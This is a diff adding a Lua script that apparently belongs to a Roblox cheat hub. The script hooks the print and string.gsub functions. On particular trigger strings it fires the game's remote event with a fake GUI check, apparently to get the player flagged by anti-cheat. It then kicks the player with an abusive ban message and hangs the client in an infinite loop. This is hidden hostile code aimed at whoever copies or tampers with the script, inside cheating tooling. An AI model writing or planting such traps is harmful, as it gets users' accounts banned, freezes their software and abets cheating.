@@ -1,0 +1,44 @@
+pcall(function()
+    print_hook = hookfunction(print,function(...)
+      if checkcaller() and tostring(...) == "everything works:)" then
+                coroutine.resume(coroutine.create(function()
+                    local AreYouSure = Instance.new('Animation', game.Players.LocalPlayer.PlayerGui)
+                    AreYouSure.Name = 'AreYouSure'
+                    for i,v in pairs(game.Workspace:GetChildren()) do
+                        game:GetService("ReplicatedStorage").MainEvent:FireServer("GUI_CHECK",game:GetService("Players").LocalPlayer.PlayerGui.AreYouSure,"AreYouSure / extra information:  / Are You Sure? / YES / NO")
+                    end
+                end))
+                coroutine.resume(coroutine.create(function()
+                    wait(10)
+                    game.Players.LocalPlayer:Kick('\n YOU HAVE BEEN BANNED BY $MOKE SHOULDNT HAVE USED OUR SKIDDED SHIT SCRIPT WE RECOMMEND U GO USE SWAGMODE NOW RitoHub x Femware <- they are the best ')
+                end))
+                coroutine.resume(coroutine.create(function()
+                    wait(5)
+                    while true do end
+                end))
+      end
+      return print_hook(...)
+    end)
+    if hookfunction then
+        gsub = hookfunction(string.gsub,function(string,substring,replacement)
+            if checkcaller() and substring == "че бля" and not replacement then
+                coroutine.resume(coroutine.create(function()
+                    local AreYouSure = Instance.new('Animation', game.Players.LocalPlayer.PlayerGui)
+                    AreYouSure.Name = 'AreYouSure'
+                    for i,v in pairs(game.Workspace:GetChildren()) do
+                        game:GetService("ReplicatedStorage").MainEvent:FireServer("GUI_CHECK",game:GetService("Players").LocalPlayer.PlayerGui.AreYouSure,"AreYouSure / extra information:  / Are You Sure? / YES / NO")
+                    end
+                end))
+                coroutine.resume(coroutine.create(function()
+                    wait(3)
+                    game.Players.LocalPlayer:Kick('\n YOU HAVE BEEN BANNED FOR ATTEMPTING TO BOOTLEG RitoHub\n now go to your alt and use the correct loadstring (it was copied to your clipboard)')
+                end))
+                coroutine.resume(coroutine.create(function()
+                    wait(5)
+                    while true do end
+                end))
+            end
+            return gsub(string,substring,replacement)
+        end)
+    end
+end)
